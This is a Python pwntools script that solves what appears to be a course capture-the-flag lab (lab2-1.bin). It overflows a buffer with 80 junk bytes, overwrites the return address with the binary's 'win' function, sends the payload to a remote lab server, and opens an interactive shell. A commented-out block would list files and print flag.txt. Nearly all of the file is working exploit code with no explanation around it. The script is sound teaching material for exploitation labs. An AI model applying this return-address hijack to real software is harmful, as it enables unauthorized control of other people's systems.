from pwn import *
import os
import sys
import time

# connect to local binary process using with gdb via pwn tools for debugging capabilities
# p = gdb.debug("./lab2-1.bin")

# connect to local binary process using pwn tools w/o gdb
# p  = process ("./lab2-1.bin")

# hardcoded win function address can be obtained manually by running from objdump or gdb on the binary locally
# winFuncAddrHex = 40130f
# print(type(winFuncAddrHex)) # Testing code

# initialize local binary process to pwn tools ELF function for inspection
e = ELF("./lab2-1.bin")

#  get "win" function automanically using pwn tools
winFuncAddr = e.symbols["win"]

# print "win" addres in  decimal, hex , packed binary64 bit format
print("This is the address of 'win' function in demicimal format: {0}".format(winFuncAddr))
print("")
print("This is the address of 'win' function in hexadecimal format: 0x{:X}".format(winFuncAddr))
print("")
print("This is the address of 'win' function in packed 64bit format: {0}".format(p64(winFuncAddr)))
# you can also use the  'echo -e  " and 'hexdump -C' command to manually get the byte format of the address which includes a special characters
# 'echo -c "\x0f\x13\x40\x00\x00\x00\x00\x00" | hexdump -C'
# hexdump is for inspection, you would run 'echo -e > file.txt' to output to  a file capture the special characters for reply

# connect to remote server process at port 7021
print("")
p = remote("csc748.hostbin.org", 7021)

# read  and print response
response = p.recvuntil(":")
print(response)

junkbytes = ((b'A'*8) + (b'B'*8) + (b'C'*8) + (b'D'*8) + (b'E'*8) + (b'F'*8) + (b'G'*8) + (b'H'*8) + (b'I'*8) + (b'J'*8)) 
alignmentbytes = (b'\x00\x00\x00\x00\x00\x00\x00\x00')
print("The final payload is: ", (junkbytes + p64(winFuncAddr) + alignmentbytes))
p.sendline(junkbytes + p64(winFuncAddr) + alignmentbytes)
print("")

p.interactive()

#response = p.recvuntil("!")
#print(response)

#sleep(10)
#p.interactive()
#p.sendline(b'cat')

"""
# print flag.txt
p.sendline(b'echo ""')
p.sendline(b'echo "Listing and printing the flag [+][+][+][+][+]"')
p.sendline(b'echo ""')
p.sendline(b'ls -alh')
p.sendline(b'echo "";')
p.sendline(b'cat flag.txt')
p.sendline(b'echo ""')

# switch to interactive session
#p.clean()
p.interactive()
"""
